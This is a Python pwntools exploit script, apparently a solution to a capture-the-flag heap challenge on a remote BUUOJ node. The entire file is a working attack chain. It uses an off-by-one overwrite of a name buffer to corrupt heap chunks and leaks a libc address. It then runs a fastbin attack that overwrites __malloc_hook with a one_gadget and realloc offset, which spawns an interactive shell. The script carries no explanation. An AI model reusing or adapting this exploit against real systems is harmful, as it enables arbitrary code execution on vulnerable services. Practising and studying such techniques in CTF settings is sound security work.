from pwn import *
#p=process('./1')
p=remote('node3.buuoj.cn',26150)
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
libc=ELF('libc-2.23_64.so')
context.terminal = ['tmux','splitw','-h']
def debug():
    gdb.attach(p)
    pause()
def name(nam): #0x30
    p.recvuntil('Please input your name')
    p.sendline(str(nam))
def add(size):
    p.recvuntil('6.exit')
    p.sendline('1')
    p.recvuntil('Input the size')
    p.sendline(str(size))
def delete():
    p.recvuntil('6.exit')
    p.sendline('2')
def show():
    p.recvuntil('6.exit')
    p.sendline('3')
def rename(name): #0x31
    p.recvuntil('6.exit')
    p.sendline('4')
    p.recvuntil('Please input your name')
    p.sendline(str(name))
def edit(note):
    p.recvuntil('6.exit')
    p.sendline('5')
    p.recvuntil('Input the note')
    p.sendline(str(note))
name(0x30*'a')
add(0x90)
add(0x18)
rename(0x30*'a'+'\x10')
delete()
add(0x20)
rename(0x30*'a'+'\x40')
#debug()
show()
#libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['main_arena']-88
libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b20-88
print hex(libc.address)
print hex(libc.sym['__malloc_hook'])
add(0x68)
delete()
add(0x10)
rename('a'*0x30+'\x40')
edit(p64(libc.sym['__malloc_hook']-0x23))
add(0x68)
add(0x68)
og=[0x45216,0x4526a,0xf02a4,0xf1147]
edit('a'*11+p64(libc.address+og[1])+p64(libc.sym['realloc']+16))
#edit(0x13*'a'+p64(libc.address+og[3]))
add(0x10)
p.interactive()
    
